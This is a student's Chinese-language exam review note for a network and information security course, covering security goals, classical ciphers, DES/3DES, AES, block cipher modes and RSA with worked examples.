+++
title = '复习||网络安全'
date = 2024-01-03T20:28:39+08:00
draft = true
lastmod = 2024-01-07T22:10:05+08:00
mermaid = true
+++


# 网络安全复习23



期末复习提纲 – 计算机与网络信息安全23秋中美

题型（暂定）：填空1x10=10分，选择1x20=20分，简答题6x5=30分，应用题4x10=40分，总分100分，折合60%，平时成绩40%。



## 一、概述

> - [x] 👌计算机安全目标/有哪些？其含义分别是什么？（最核心的三个目标CIA、以及真实性、可追溯性/可审查性）

### ✨安全的三个基本目标CIA

* **机密性（ Confidentiality ）** 对信息的访问和公开进行授权限制
  * 数据保密性：确保隐私或者密码信息不向非授权者泄露，也不被非授权者所使用
  * 隐私性：确保个人能够控制或确定与其自身相关的哪些信息是可以被收集、被保存的，这些信息可以由谁来公开以及向谁公开
* **完整性（ Integrity ）** 防止对信息的不恰当修改或破坏
  * 数据完整性：包括信息和程序只能以特定和授权的方式进行改变。还包括数据真实性和不可否认性。
  * 系统完整性：确保系统以一种正常的方式来执行预定的功能
* **可用性（ Availability ）** 确保对信息的及时和可靠的访问和使用，对授权用户不能拒绝服务

### ✨安全的其他目标

* **真实性(authenticity)、认证/鉴别**：一个实体是真实的、可被验证的和可被信任的特性；对传输信息来说，信息和信息源是正确的。

* **审计性（Accountability）、可追溯性**：要求通过实体的行为可以唯一追溯到该实体，支持不可否认性、阻止、故障隔离、入侵检测和预防、事后恢复，以及法律诉讼。
  * 不可否认性（Non-repudiation ）：要求无论发送方还是接收方都不能抵赖所进行的传输或操作

* **可控性（ controllability ）**
  * 能够掌握和控制信息及信息系统的情况，对信息和 信息系统的使用进行可靠的授权、审计、责任认定、 传播源与传播路径的跟踪和监管等。

![image-20240102142921914](image-20240102142921914.png)

> - [x] 👌OSI安全框架定义了哪三个方面？安全机制和安全服务；安全攻击被分成哪两个类别，有什么特点？分别有哪些实例？（可以与实际安全问题相结合）。

### ✨OSI安全框架X.880

* **安全攻击**：任何（试图收集、破坏、拒绝、降级或破坏信息系统资源或信息本身的）恶意活动
  * 威胁：潜在可能的
* **安全机制**：用来检测、阻止攻击或者从攻击状态恢复到正常状态的过程（或实现该过程的设备）
* **安全服务**：加强数据处理系统和信息传输的安全性的一种处理过程或通信服务
  * 支持一个或多个安全需求（CIAAA）的功能
  * 安全服务通过安全机制来实现安全策略。

### ✨OSI安全体系框架



![image-20240102144311708](image-20240102144311708.png)

### ✨安全攻击

* **被动攻击**：对传输进行窃听和监测以获取传输的信息
  * 信息内容泄露
  * 流量分析

![image-20240102143340520](image-20240102143340520.png)

* **主动攻击**：对数据流进行修改或者伪造数据流
  * 伪装、重放、消息篡改和拒绝服务
  * 伪装和消息篡改都可能涉及中间人攻击

![image-20240102143437314](image-20240102143437314.png)

### ✨安全服务

* 安全服务：通信开放系统的协议层提供的服务，从而保证系统或数据传输有足够的安全性。安全服务通过安全机制来实现安全策略。

* 安全服务包括：
  * 认证：（你是谁,你来自谁）
  * 访问控制： （你能干什么，授权）
  * 数据保密性： （加密：明文变密文）
  * 数据完整性： （不求保密但求发现篡改假冒）
  * 不可否认性： （防止对收到或发出消息抵赖）
  * 可用性服务

### ✨安全机制

* 用来检测、阻止攻击或者从攻击状态恢复到正常状态的过程（或实现该过程的设备）

* 安全机制分为：
  * 密码算法、数据完整性、数字签名、认证交换（身份认证）、流量填充、路由控制、公证、访问控制
* 没有任何一种安全机制可解决所有的安全问题

## 二、数论基础（不在考试范围）

### 模运算

* 模运算即求余数（C语言中的运算符％）

  `x mod n＝a`
  其中0≤a<n, 且有整数k使kn＋a＝x。整数n称为模数。
  如：`5％3＝2；8％7＝1；16％12＝4`

* 同余关系

  若 `x mod n＝y mod n [＝ a]`

  则说x和y是模n同余的，记`x ≡ y mod n`
  如：`13 ≡ 6 mod 7；20 ≡ 7 mod 13`

* 摸算术运算

  * `（a＋b） mod n ＝ (a mod n＋b mod n) mod n`

  * `（a－b） mod n ＝ (a mod n－b mod n) mod n`

  * `（a×b） mod n ＝ (a mod n×b mod n) mod n`

  * 举例：

    > `11 mod 8 = 3;      15 mod 8 = 7`
    >
    > `[(11 mod 8) + (15 mod 8)] mod 8 = 10 mod 8 = 2`
    > `(11 + 15) mod 8 =  26 mod 8 = 2`
    > `[(11 mod 8) - (15 mod 8)] mod 8 = - 4 mod 8 = 4`
    > `(11 -  15) mod 8 = - 4 mod 8 =  4`
    > `[(11 mod 8) *  (15 mod 8)] mod 8 =  21 mod 8 = 5`
    > `(11 * 15) mod 8 = 165 mod 8 =  5`

### 模幂运算

* `（a×b） mod n ＝ (a mod n×b mod n) mod n`

  幂运算：求117mod 13=?

  > 11^2^ = 121 ≡ 4 mod 13
  >
  > 11^4^ = (11^2^)^2^ ≡ 4^2^ ≡ 3 mod 13
  >
  > 11^7^ = 11×4×3 ≡132 ≡ 2 mod 13

* **用于RSA中的模幂运算**

### 剩余集

* 模n的剩余集

  定义比n小的非负整数集合为Zn ：

  ` Zn＝{0，1，2，3，…，n-1}`
  这个集合被称为剩余类集，或模n的剩余类

* 给定了数n，则所有的整数都以同余的形式映射到模n的余数的集合上	

   Zn＝{0，1，2，3，…，n-1}

  模n的运算可定义在该集合上

### 欧拉函数

* 欧拉函数定义：`Φ(n)定义为小于n而互素的正整数的个数`

* 举例 （p、q都是素数）

  `Φ(p) ＝ p-1`

  `Φ(p×q) =φ(p)φ(q) ＝(p-1)(q-1) ＝pq-p-q+1`

* 比如n=15

  `n＝15＝3×5＝p×q`

  则φ(n)＝(3-1)×(5-1)＝8，即与n互素的元素个数为8个。

  `1、2、4、7、8、11、13、14 ≡1 mod 15 `

  而`3、 5、 6、9、10、12  ≠ 1 mod 15 `

* 欧拉函数是RSA中乘法逆元的模（模数）

### 欧拉定理

如果a、n互素，则:
$$
a^{φ(n)}≡1 \mod n
$$
进一步：
$$
a^{φ(n) + 1}≡ a \mod n : 不要求a与n互素
$$
欧拉定理的另一种形式是RSA算法中运算成立的基础。

## 三、传统加密技术

### 密钥算法分类

* 根据密钥：
  * 无密钥：密码转换中不使用任何密钥。（加密哈希函数，伪随机数生成器）
  * 单密钥：转换的结果是输入数据和单个密钥（称为秘密密钥）的函数。（分组密码对称加密，流密码对称加密，消息认证码）
  * 双密钥：在计算的不同阶段，使用两个不同但相关的密钥，这两个密钥分别称为私钥和公钥。（非对称加密，数字签名，密钥交换，用户认证）

* 根据算法功能/用途
  * 加密算法：用于机密性解决方案
  * 散列函数/消息认证码：用于完整性解决方案
  * 数字签名：用于认证和不可否认性

> - [x] 👌对称密码基本模型

对称密码也称为传统密码或者单密钥密码，即加密密钥和解密密钥是同一个密钥。优点就是简单，容易实现。

密码体制(密码)： 从明文到密文的转变过程和从密文到明文的转变过程

### 对称密码简化模型

![image-20240102210246079](image-20240102210246079.png)

> - [x] 👌对加密信息的攻击类型（密码分析学和穷举攻击）

### ✨密码分析学

19世纪末，Kerckhoffs假设：假定密码分析者和敌手知道所使用的密码系统，即密码体制的安全性<u>仅依赖于对密钥的保密</u>，而<u>不应依赖于算法的保密</u>

* 假设敌手知道：
  * 所使用的加密算法
  * 知道明文的概率分布规律；
  * 知道密钥的概率分布规律；
  * 知道所有可能的破译方法
  * 敌手能够拿到加密装置，可以对其进行能量消耗分析等等

* 敌手目标：
  * 恢复合法密文相应的明文
  * 恢复密钥

### ✨密码体系的攻击方法

* **🎯穷举攻击**：通过试遍所有的密钥来进行破译。使用计算机来对所有可能的密钥组合进行测试， 直到有一个合法的密钥能够把密文还原成明文， 这就是穷举攻击。平均来说，要获得成功必须尝 试所有可能密钥的一半。

  对抗：可增大密钥的数量。

  * 暴力破解攻击的时间复杂度是 ，当前 n= 128
  * 暴力攻击的时间复杂度常用于衡量其它密码分析攻击的有效性

* **密码分析攻击**：攻击依赖于加密／解密算法 的性质和明文的一般特征或某些明密文对。这种 攻击企图利用算法的特征来恢复出明文，或者推 导出使用的密钥。目标：获得密钥或明文

  * 唯密文攻击：仅知道一些密文，最困难，一般是穷举，最易抵抗
  * 已知明文攻击：知道多个明文，和对应的密文（同一密钥）
  * 选择明文攻击（Chosen Plaintext Attack，CPA）：分析者选择明文及对应密文，常被作为密码算法安全性分析中的攻击类型假设
  * 选择密文攻击：分析者选择一些密文，及对应的明文
  * 选择文本攻击：选择明文及对应的密文，选择一些密文及对应明文
  * 无条件安全与计算上安全

* **侧信道攻击(side-channel attack)**：探测实现环境的漏洞，如计时攻击、能量分析攻击

  * 计时攻击: 攻击者分析特定运算的计算时间
    * 如果当密钥(每一位)具有不同的值时，特定运算的运算时间会发生明显变化，则计时攻击有效
    * 可以通过在执行指令时加入冗余运算来平滑计算时间

* **能量分析攻击**：攻击者分析特定运算所需的能量

> - [x] 👌传统加密技术的两个基本基本模块（代换和置换），以及传统加密算法（单表代换、多表代换和一次一密，注意缺点）

 ### ✨代换和置换（古典密码）

#### 常见古典密码算法

* 凯撒密码、单表代换
* 双字母加密：playfair密码

* 线性变换：hill密码
* 多表代换： Vigenère密码
* 转轮机：ENIGMA（二战）
* One-time Pad(OPT): Vernam密码
* 置换密码

#### 代换技术： Caesar/Shift Cipher移位密码

* 明文： 26字母

  密文： 26字母

* 加密：每个字母使用其后第3个(循环)代替

  解密：其前第3个，或其后第23个

> 举例：
>
> ​	明文 meet me after class
>
> ​	密文 PHHW PH DIWHU FODVV

#### 加法密码（Caesar密码是一种加法密码）(k=3)

`y=x+k(mod 26)`

* 明文：x

* 密文：y

* 密钥：k

解密：`x=y-k(mod 26)`

> 举例：（Caesar密码)
>
> |   字母   |   a   |   b   |   c   |   d   |   e   |   f   |   g   |   h   |   i   |   j   |   k   |   l   |   m   |
> | :------: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
> |   数字   |   0   |   1   |   2   |   3   |   4   |   5   |   6   |   7   |   8   |   9   |  10   |  11   |  12   |
> | **字母** | **n** | **o** | **p** | **q** | **r** | **s** | **t** | **u** | **v** | **w** | **x** | **y** | **z** |
> |   数字   |  13   |  14   |  15   |  16   |  17   |  18   |  19   |  20   |  21   |  22   |  23   |  24   |  25   |

### ✨单表代换密码

* 单表代换：一个代换表

* 查对照表

  ```bash
  密文：abcdefghijklmnopqrstuvwxyz
  明文：RFAPCBZDQVJHKMWGSYUIXELNTO
  ```

* 明文/密文

  * meet me after class 
  * KCCI KC RBUCY AHRUU 

* 密钥空间：`26！> 10^25`

#### 单表代换实例

* 加密

> Plain:   abcdefghijklmnopqrstuvwxyz 
>
> Cipher:   DKVQFIBJWPESCXHTMYAUOLRGZN
>
> Plaintext: `if we wish to replace letters`
>
> Ciphertext: `WI RF RWAJ UH YFTSDVF SFUUFYA`

* 解密

> Ciphertext: WI RF RWAJ UH YFTSDVF SFUUFYA
>
> Plaintext: if we wish to replace letters
>
> Cipher:   `ABCDEFGHIJKLMNOPQRSTUVWXYZ`
>
> Plain:   `sgmakexofhbvqzujdwlptcinry`

#### 单表代换分析

* 字母出现频率

  ![image-20240102202225422](image-20240102202225422.png)

* 字母组合概率

  * 双字母组合：th、he、in、er、
  * 三字母组合：the、ing、and、
  * 单词出现概率组合：

  ![image-20240102202308534](image-20240102202308534.png)

#### 单表代换攻击步骤

1. 先得有足够多的密文
   * 几十个
   * 明文得有明确的意义(古典算法时通常是这样的)
2. 统计密文中各个字母的出现概率
3. 结合明文的统计
   * 猜测出现得最多密文字母对应明文字母e(或t、a)，最少的是z(或j)
   * 猜测出现得最多密文字母双组是th
   * 观察所谓的明文，并重试

### ✨多表代换(Vigenère密码)

使用多个(单)表，如：we are discovered save your self

| key(repeat) | `deceptive` | `deceptive` | `deceptive`  |
| :---------: | :---------: | :---------: | :----------: |
|  Plaintext  | `wearedisc` | `overedsav` | `eyourselef` |
| Ciphertext  | `ZICVTWQNG` | `RZGVTWAVZ` | `HCQYGLMGJ`  |

![image-20240102202919648](image-20240102202919648.png)

#### 字母出现的相对频率

![image-20240102202947258](image-20240102202947258.png)

### Vernam密码（1918）

选择一个和明文毫无统计关系，且和明文一样长的密钥，明文与密钥按位异或

![image-20240102203030719](image-20240102203030719.png)

### ✨One-time Pad 一次一密

* 举例：哪一个明文/密钥是正确的呢？

  * 密文 I P K L P S F H G Q
  * 密钥 U C G S H G B S G N （猜）
  * 明文 o n e t i m e p a d 
    * `one time pad`
  * 密文 I P K L P S F H G Q
  * 密钥 D B Q U B Q U T E G （再猜） 
  * 明文
    * `four o’clock`

  ![image-20240102204501045](image-20240102204501045.png)

  ###### 一次一密的安全性

  * 是唯一具有理论安全性的算法

  * 也可以直接用于二进制（XOR）
    * 流密码算法就是使用密钥为种子产生伪随机序列并和明文XOR

  * 问题：
    * 产生大规模随机密钥存在实际困难
    * 密钥的分发和保护

  * 伪随机数生成算法和流密码（见教材八章）

#### 无条件安全与计算上安全

* 无条件安全的(不可破译的)：
  * 无论截获多少密文，都没有足够信息来唯一确定明文，则该密码是无条件安全的，即对算法的破译不比猜测有优势，如一次一密（one time pad）

* 计算上安全的：
  * 使用有效资源对一个密码系统进行分析而未能破译，则该密码是强的或计算上安全的

* 密码算法只要满足以下两条准则之一，在实际中即可用：
  * 破译密文的代价超过被加密信息的价值
  * 破译密文所花的时间超过信息的有用期

#### 置换技术

* Substitution → Transposition

  不是代换，而是重排明文（“洗牌”） ，即明文的字母顺序被打乱了，但明文字母本身不变

##### 更复杂的列置换

* 把信息一行一行写出来，然后打乱列的次序读出，列的次序就是算法的密钥

$$
\begin{split}
& Key:   & 4\quad3\quad  1\quad  2\quad  5\quad  6\quad  7\\\\
& Plaintext:     & a\quad  t\quad  t\quad   a\quad  c\quad k\quad  p\\\\
& & o\quad  s\quad  t\quad  p\quad  o\quad  n\quad  e\\\\
& & d\quad  u\quad  n\quad  t\quad   i\quad  l\quad   t\\\\
& & w\quad  o\quad  a\quad  m\quad  x\quad  y\quad  z\\\\
& Ciphertext: & TTNAAPTMTSUOAODWCOIXKNLYPETZ\\\\
\end{split}
$$

* 多次置换相对来说更安全

## 四、分组密码和数据加密标准DES

> - [x] 👌对称密码算法按照对明文的处理方式不同可以分成哪两类? 二者差异

### ✨对称密码分类及区别

* 对称密码分为两大类：**分组密码和流密码**。 

  * 分组密码(block cipher)：又称块密码，它将明文消息划分成若干长度为m(m>1)的分组（或块），各组分别在长度为r的密钥K的控制下转换成长度为n的密文分组。一般情况下m=n，典型的大小是64位或128位。<u>常见的分组算法有DES、DES3、IDEA、AES等。（公钥密码RSA也属于分组密码）。</u>

  * 流密码(stream cipher)：又称作序列密码，加密和解密每次只处理数据流的一个符号（如一个字符或一个比特）。（Vernam密码和一次一密）。<u>常见的流算法有RC4， Salsa20/12， ChaCha20-Poly1305等。</u>

> - [x] 👌DES密码算法的基本参数（明密文分组长度，密钥长度）

### 分组密码

#### ✨DES数据加密

* Data Encryption Standard
  * 1971 IBM Horst Feistel
    * Lucifer → DES，key由128bit→56bit
  * 1973 NBS征集美国国家密码标准方案，1977 NIST FIPS-46
  * 1994 最后一次延长到1999年
    * AES取代之

* ✨参数
  * Feistel体制分组密码
  * **分组大小 64bit，密钥大小 56bit，轮数 16轮**
  * S-Boxes 

> - [x] 👌Feistel密码结构（具体结构不在考试范围）、混淆（c和k）和扩散（c和m）

#### ✨Feistel(DES)加密框架

* 明文分组的长n＝2w
  * 分**左右两半**L0 R0

* 密钥K产生**子密钥**：K→k1，k2，…，kr 
  * r是轮数，比如16轮

* ⊕是**异或**函数XOR
  * p⊕x⊕x = p

* F是**轮函数**
  * 可以是手工精心构造的查表函数

##### ✨Feistel网络

乘积密码：重复使用代替和置换，实现**混淆(C,K)和扩散(C,M)**。

![1704286188421](1704286188421.png)

##### Feistel——'for' Loop

* 加密计算序列

$$
L0＝左半\quad &R0＝右半\\
L1＝R0\quad   &R1＝L0⊕F(k1,R0)\\
L2＝R1\quad  &R2＝L1⊕F(k2,R1)\\
L3＝R3\quad  &R3＝L2⊕F(k3,R2)\\
...&...\\
Li＝Ri-1\quad   &Ri＝Li-1⊕F(ki,Ri-1)\\
...&...\\
Ln＝Rn-1\quad   &Rn＝Ln-1⊕F(kn,Rn-1)\\
$$

* 密文即：（Ln，Rn）

* 解密计算：与加密过程一致，逆序使用密钥

![image-20240103205451170](image-20240103205451170.png)

#### ✨DES安全强度

* 争论的焦点主要集中于**密钥的长度**和**算法本身的安全性**

* 密钥空间太小，仅有56位，穷举攻击
  * 从Lucifer的2^128^降到DES的2^56^
  * 2000年1月，DES Challenge III, 22 hours 15 minutes

* 解决DES密钥长度过短，可以采用组合密码技术， 三重DES(简写为DES3或 3DES)是最常用的组合密码技术

##### 穷举密钥搜索所需要的时间

|      Key  Size (bits)       |     Cipher     | Number  of Alternative Keys | Time  Required at 10^9^ Decryptions/s | Time  Required at 10^13^Decryptions/s |
| :-------------------------: | :------------: | :-------------------------: | :-----------------------------------: | :-----------------------------------: |
|             56              |      DES       |   2^56^  ≈  7.2 × 10^16^    |        2^55^  ns = 1.125 years        |                1  hour                |
|             128             |      AES       |  2^128^ ≈ 3.4  ×  10^38 ^   |   2^127^ ns = 5.3 ×  10^21^  years    |          5.3 ×  10^17^ years          |
|             168             |  Triple  DES   |  2^168^ ≈  3.7  ×  10^50^   |    2^167^ ns = 5.8 ×  10^33^ years    |          5.8 × 10^29^  years          |
|             192             |      AES       |  2^192^ ≈  6.3  ×  10^57^   |   2^191^ ns = 9.8 ×  10^40^  years    |         9.8 ×  10^36^  years          |
|             256             |      AES       |   2^256^≈  1.2  ×  10^77^   |    2^255^ ns = 1.8 ×  1060  years     |          1.8 × 10^56^  years          |
| 26 characters (permutation) | Monoalphabetic |      2! = 4 ×  10^26^       |  2 × 10^26^ ns  = 6.3 ×  10^9^ years  |          6.3 ×  10^6^ years           |

> - [x] 👌三重DES及密钥使用、以及双重DES（中间相遇攻击）和三重DES（已知明文攻击）可能面临的攻击形式

#### ✨双重DES

多次加密的最简单形式是进行两次加密，使用两个密钥。给定明文P以及密钥K~1~，K~2~密文C按照下述方式生成：
$$
C=E(K_2,E(K_1,P))
$$
解密时逆序使用这两个密钥
$$
P=D(K_1,D(K_2,C))
$$
DES加密是64位分组之间的映射，实际上映射可以看成一个置换，这就是说，对2^64^个可能的明文分组，DES用特定的密钥加密后都唯一对应一个64位的密文分组，否则即是两个输入块映射为一个输入块，则解密已恢复原始的明文就不可能了。那么，2^64^个可能的输入，一对一映射的数量是：
$$
(2^{64})! =10^{347,380,000,000,000,000,000}>(10^{10^{20}})
$$
另一方面，DES为每个密钥定义了一个映射，映射总数是
$$
2^{56}<10^{17}
$$
![1704513446307](1704513446307.png)

#### 中间相遇攻击

双重DES对应的映射与单DES对应的映射不同，但是还有另外一种攻击方法，**这种方法不依赖于DES的如何特殊性质，对所有分组密码都有效。**

==中间相遇攻击==

假设有：
$$
C=E(K_2,E(K_1,P))
$$
则有：
$$
X=E(K_1,P)=D(K_2,C)
$$
攻击步骤：

> 给定明密文对`(P,C)`
>
> 1. P按所有可能的密钥K~1~加密，得到2^56^个结果
> 2. 将结果按X的值排序在一个表内
> 3. 将C用所有的可能的密钥K~2~解密，每解密一次就将解密结果与表中的值比较
> 4. 如果有相等的就用刚才密钥对对一个新的明密文对进行验证
> 5. 如果两个密钥产生了正确的密文，就认定这两个密钥是正确的密钥

对任意明文P，双重DES后可能得到2^64^个密文中的一个，双重DES使用了112位密钥，密钥空间是2^112^，因此，对明文P可以产生密文C的密钥个数平均为2^112^/2^64^=2^48^。

故上述攻击对第一个`(P, C)`将产生2^48^个错误的结果，而对第二个64位`(P, C)`，错误结果的概率就降为2^48-64^=2^-16^。即中间相遇攻击使用两组已知明密文对`(P, C)`就可以猜出正确密钥的概率为1-2^-16^。

结论：**已知明文攻击可以成功对付密钥长度为112位的双重DES。其付出是2^56^数量级的，比攻击单DES所需的2^55^数量级多不了多少。**

#### ✨3DES——三重DES(TDEA)

* 使用3个密钥，168bits

$$
C=E(K_3,D(K_2,E(K_1,P)))
$$

 与单DES兼容：取K~3~=K~2~或K~1~=K~2~

![image-20240103212401610](image-20240103212401610.png)

## 五、有限域（不在考试范围）

 

## 六、高级加密标准AES——128

### 从3DES到高级数据加密标准AES

* 3DES(FIPS 46-3)
  * 优点：能继续使用原有的DES软硬件模块，保护了投资；
  *  缺点：速度慢，而且64位分组显得太小。

* AES是重新遴选和设计的代替DES/3DES的下一代对称算法推荐标准。

* DES/AES之外还有其他很多对称算法可用，也包括流密码等，如Blowfish、RC5、 RC6、IDEA、CAST-128

> - [x] 👌AES密码算法的基本参数（明密文分组长度，密钥长度，见书上表6.1） 及每轮中的基本操作（不在考试范围）

 ### 高级加密标准AES准则

* AES Homepage
  * http://www.nist.gov/aes/ 
  * FIPS 197[http://csrc.nist.gov/](http://csrc.nist.gov/CryptoToolkit/aes/)[CryptoToolkit](http://csrc.nist.gov/CryptoToolkit/aes/)[/](http://csrc.nist.gov/CryptoToolkit/aes/)[aes](http://csrc.nist.gov/CryptoToolkit/aes/)[/](http://csrc.nist.gov/CryptoToolkit/aes/) 

* 时间表
  * 1997年，要求算法公开、自由，密钥128＋
  * 1998/8/20，征集到15个候选算法
  * 1999/3,4，经分析开会讨论落实了5个算法

* MARS, RC6, Rijndael, Serpent, Twofish
  * 2000/10/2，选定Rijndael为AES
  * 2001/11，FIPS 197

### ✨AES分组长度、密钥长度

|         |  Key  | Block | Rounds |
| :-----: | :---: | :---: | :----: |
| AES-128 | 128位 | 128位 |  10轮  |
| AES-192 | 192位 | 128位 |  12轮  |
| AES-256 | 256位 | 128位 |  14轮  |

### ✨表6.1

![1704289234439](1704289234439.png)

### AES每轮中的操作

1. x→state（输入）

   AddRoundKey（轮密钥加）

2. N~r-1~轮

   S: SubBytes（**字节代换**）

    P: ShiftRows（**行移位**）

    MixColumns（**列混淆**）

    AddRoundKey（**轮密钥加**）

3. 最后1轮

   S: SubBytes（字节代换）

    P: ShiftRows（行移位）

    AddRoundKey（轮密钥加）

4. state→y（输出）

#### 以AES-128为例，即128密钥

![image-20240103213403940](image-20240103213403940.png)

## 七、分组加密的工作模式

> - [x] 👌分组密码算法工作模式：ECB、CBC、CFB、OFB、CTR（详见ppt），全称与英文缩写，每种模式加解密特点（表7.1）
>

### 分组密码的工作模式(表7.1)

![1704519153199](1704519153199.png)

 ### ✨ECB：电话本模式

![image-20240103214910541](image-20240103214910541.png)

### ✨CBC：密文分组链接模式

![image-20240103214943643](image-20240103214943643.png)

![image-20240106133358097](image-20240106133358097.png)

### ✨CFB：密文反馈模式

![image-20240106133453954](image-20240106133453954.png)

### ✨OFB：输出反馈模式

![image-20240106133518114](image-20240106133518114.png)

### ✨CTR：计数器模式

![image-20240106133536306](image-20240106133536306.png)

## 八、伪随机数的产生和流密码

12、随机数的产生和使用（ppt上没有，不在考试范围）

13、流密码特点、RC4算法（算法参数：166页提到：面向字节运算的变长密钥流密码）

 

## 九、公钥密码学与RSA

> - [x] 👌公钥密码术语，见书上表9.1

### 公钥密码术语(表9.1)

![1704520755164](1704520755164.png)

### ✨公钥密码体制(✨图9.1(a))

* **明文**：算法的输入。它们是可读信息或数据
* **加密算法**：加密算法对明文进行各种转换
* **公钥和私钥**：算法的输入。这对密钥中一个用于加密，一个用于解密。加密算法执行的变换依赖于公钥或者私钥。

#### 用公钥加密

![1704519813974](1704519813974.png)

#### 用私钥加密

![1704519826460](1704519826460.png)

* **密文**：算法的输出。它依赖于明文和密文，对给定的消息，不同的密钥产生的密文不同。

* **解密算法**：该算法接收密文和对应的密钥，并产生原始的明文

  其主要步骤：

  > 1. 每一用户产生一对密钥，用来加密和解密消息。
  > 2. 每一用户将其中一个密钥存于公开的寄存器或其他可访问的文件中，该密钥称为公钥，另一密钥是私有的（如图9.1(a）)所示，每一用户可以用于若干其他用户的公钥
  > 3. 若Bob要发消息给Alice，则Bob用Alice的公钥对消息加密。
  > 4. Alice收到消息后，用其私钥对消息解密。由于只有Alice知道其自身的私钥，所以其他的接受者均不能解密出消息。



> - [x] 👌公钥密码体制的应用，主要指公钥的加解密、密钥分配/交换和数字签名等方法的应用/作用。见书上表9.3和ppt上

### ✨公钥密码体制的应用

公钥密码体制的应用可分为三类：

* **加密/解密**：发送方用接收方的公钥对消息加密。
* **数字签名**：发送方用其私钥对消息“签名”。签名可以通过对整条消息加密或者对消息的一个小的数据块加密来产生，其中该小数据块是整条消息的函数。
* **密钥交换**：通信双方交换会话密钥。有几种不同的方法可用于密钥交换，这些方法都是使用了通信一方或双方的私钥。

![1704524683297](1704524683297.png)

公钥密码体制中的两个密钥任何一个都可以用来加密，而另一个用来解密，这样就可以利用公钥密码实现其他一些功能，如图9.2所示的方法可以提供保密性，图9.1(b)和图9.3说明公钥密码可以用于认证。

![1704521689207](1704521689207.png)

#### 公钥算法用于认证

* 如果你(Bob)已经公布自己的公钥`Ke`，则他人可认证/鉴别你发出的消息（及你的身份）

* 对于消息`P`，使用你的私钥

  `C = E（P，Kd）`

* 他人可把密文`C`用你的公钥解密

  `D（C，Ke）＝P`

* 可以确信`P`必然是由你加密成`C`的，因为加密需要的私钥只有你有。

![1704522217177](1704522217177.png)

A向B发送消息前，先用A的私钥对消息进行加密，B则用A的公钥对消息进行解密。

由于消息只可能由A的私钥加密而来，因此，**整个加密后的消息就是数字签名**。

此外，因为只有拥有A的私钥才能产生上述加密后的消息，**因此该消息可用于认证源和数据完整性**。

#### 消息来源认证和数字签名

##### 消息来源认证

* **假设使用加解密操作对称的算法如RSA**

* 对消息`H`签名：

  `S = Sig（H，Kd）`

* 验证

  `Ver（C，Ke）＝？ H`

* 消息`H`必然是`Kd`的持有人签署的

##### 认证保密

上述介绍的认证，考虑到所有人都可以获得A的公钥从而解密A的消息，所以其实消息的保密性并没有得到保证，假若需要保证`认证+保密`，可以两次使用公钥方法：

![1704523523945](1704523523945.png)

##### 签名的具体实现

* 有消息要发给对方，要署名且保密传递



* 发送方：先用自己的私钥签名
* 发送方：再用对方的公钥加密



* 发送消息，消息达到接收方



* 接收方：先用自己的私钥解密
* 接收方：再用对方的公钥验证签名是否有效

### ✨公钥密码的特点

> - [x] 👌与对称密码对比，公钥密码的特点，见书上的表9.2

![1704521527004](1704521527004.png)

### 公钥算法安全性的数学基础

> - [x] 👌公钥算法安全性的数学基础有哪些？大整数分解及离散对数问题的难解性

转上[数论部分](#二、数论基础（不在考试范围）)

#### ✨模幂运算

> - [x] 👌理解模幂运算，包括: C=M^e^ mod n, 则M=C^d^ mod n；掌握RSA算法的计算（必考）

* `（a×b） mod n ＝ (a mod n×b mod n) mod n`

  幂运算：求11^7^ mod 13=?

  > 11^2^ = 121 ≡ 4 mod 13
  >
  > 11^4^ = (11^2^)^2^ ≡ 4^2^ ≡ 3 mod 13
  >
  > 11^7^ = 11x4x3 ≡132 ≡ 2 mod 13

#### ✨✨RSA算法的计算

RSA体制是一种分组密码，其明文和密文均是0至某n-1之间的整数，通常n的大小为1024位二进制数或309位十进制数，也就是说n小于2^1024^。

##### RSA算法描述

RSA算法使用乘方运算，明文以分组为单位进行加密，每个分组的二进制值均小于n，也就是说，分组的大小必须小于或等于$log_2(n)+1$位，在实际应用中，分组的大小是i位，其中$2^i<n\leq 2^{i+1}$。对<u>明文分组M</u>和<u>密文分组C</u>：

加密：
$$
C=M^e \mod n
$$
解密：
$$
M=C^{d}\mod n=(M^{e})^{d}\mod n=M^{ed}\mod n
$$
其中收发双方均已知n，发送方已知e，只有接收方已知d，因此公钥加密算法的公钥为`PU={e,n}`，私钥为`PR={d,n}`。该算法要能对公钥加密，必须满足下列条件：

1. 可以找到e, d和n，是的对所有M<n，有$M^{ed}=M \mod n$。
2. 对所有M<n，计算$M^e$和$C^d$是比较容易的。
3. 由e和n确定d是不可行的。

##### 生成密钥对

公钥是公钥为`PU={e,n}`，私钥为`PR={d,n}`，密钥对是`{e,d,n}`。

生成密钥对的步骤：

> 1. 求n
> 2. 求L(L为中间过程的中间数)
> 3. 求e
> 4. 求d



==求n==

准备两个大素数p和q（典型值是1024位）

`n=pxq`

==求L==

L是`p-1`和`q-1`的最小公倍数

`L=lcm(p-1,q-1)`

==求e==

e满足条件：

1. `1<e<L`
2. `gcd(e,L)=1`

之所以需要e和L互质是为了保证一定存在解密时需要使用的数D。

现在我们已经求出了e和n也就是说我们已经生成了密钥对中的公钥了。

==求d==

d是由数e计算出来的，满足：

1. `1<d<L`
2. `e*d mod L=1`

只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。 

简单地说条件2是为了保证密文解密后的数据就是明文。 

现在私钥自然也已经生成了，密钥对也就自然生成了。

##### 例题

> 选两个小的质数
>
> `p ＝ 11`
>
> `q ＝ 13`
>
> `n ＝ p ＊ q ＝ 143`
>
> `L ＝ lcm（p－1， q－1）＝ lcm(10，12） ＝ 60 `
>
> 
>
> `1<e<L`
>
> `1<d<L`
>
> `gcd(e,L)=1`
>
> `e*d mod L=1`
>
> 取`e=7`，取`d=43`
>
> 得公钥`PU={7,143}`，私钥`PR={43,143}`

书上例子：

> ![1704543723283](1704543723283.png)
>
> ![1704543742782](1704543742782.png)
>
> ![1704543770258](1704543770258.png)
>
> ![1704543776624](1704543776624.png)

PPT例子：

> 在公钥密码算法RSA中，已知：p＝11，q＝3，任选e＝3（公钥）；密文c=4。回答以下问题：
> Φ(n)=?，n=?； 私钥d=?； 明文m＝？。
> N=p*q=33
>
> 
>
> Φ(n)=(p-1)(q-1)=10*2=20
>
> E=3, ed mod Φ(n)=1, so d=7
>
> M=C^d mod n
>
> M=4 ^ 7 mod 33

RSA的加解密过程

![1704543820754](1704543820754.png)

> - [x] 👌针对RSA算法有哪些类型的攻击（RSA的安全性）

####  针对RSA的攻击

* 穷举攻击：这种方法试图穷举所有可能的私钥
* 数学攻击：有多种数学攻击方法，它们的实质都是试图分解两个素数的乘积
